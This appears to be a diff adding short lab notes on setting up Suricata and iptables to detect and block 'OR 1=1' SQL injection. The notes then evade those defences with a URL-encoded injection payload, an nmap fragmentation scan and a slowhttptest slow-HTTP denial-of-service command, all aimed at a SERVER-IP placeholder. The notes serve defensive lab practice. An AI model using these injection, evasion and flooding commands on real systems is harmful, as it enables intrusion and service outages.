@@ -1,0 +1,57 @@
+#############################################################
+
+
+sudo apt update
+sudo apt install suricata -y
+
+
+
+sudo nano /etc/suricata/rules/sql.rules
+
+
+alert http any any -> any any (msg:"SQL Injection Attempt"; content:"OR 1=1"; nocase; sid:1000001;)
+
+#####################################################################
+
+
+
+sudo nano /etc/suricata/suricata.yaml
+
+
+- sql.rules
+
+#####################################################################
+
+sudo suricata -i eth0 -c /etc/suricata/suricata.yaml
+
+
+http://SERVER-IP:5000/login?user=' OR 1=1--&pwd=x
+
+sudo tail -f /var/log/suricata/fast.log
+
+##################################################################################
+
+sudo apt install suricata iptables -y
+
+sudo iptables -A INPUT -p tcp --dport 5000 -m string --string "OR 1=1" --algo bm -j DROP
+##################################################################################
+
+evading firewall
+
+http://SERVER-IP:5000/login?user=%27%20OR%201%3D1--&pwd=x
+##################################################################################
+# packet fragmentation
+nmap -f SERVER-IP
+
+sudo apt install slowhttptest
+
+slowhttptest -c 1000 -H -i 10 -r 200 -t GET -u http://SERVER-IP:5000
+##################################################################################
+
+
+
+
+
+
+
+
